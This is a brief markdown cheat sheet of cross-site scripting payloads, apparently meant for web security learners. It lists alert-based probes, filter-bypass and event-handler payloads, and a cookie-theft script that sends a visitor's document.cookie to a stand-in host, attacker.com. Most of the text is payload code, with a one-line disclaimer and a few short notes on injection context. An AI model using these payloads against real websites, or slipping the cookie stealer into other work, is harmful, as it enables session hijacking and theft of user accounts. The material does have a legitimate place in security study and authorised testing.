# 💣 XSS Payload Reference

## ⚠️ Note
Payloads are for educational purposes in controlled environments only.

---

## 🔰 Basic Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

---

## 🔓 Filter Bypass Payloads

```html
<svg onload=alert(1)>
<body onload=alert(1)>
```

---

## 🔄 Event-Based Payloads

```html
<input onfocus=alert(1)>
<button onclick=alert(1)>Click</button>
```

---

## 🍪 Cookie Theft

```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

---

## 🧠 Why Payloads Vary

Depends on:
- filtering rules
- context of injection
- browser behavior

---

## ❌ Common Mistake

Using only one payload without understanding context.

---

## 🧾 Key Takeaways

- payload success depends on context
- testing must be iterative
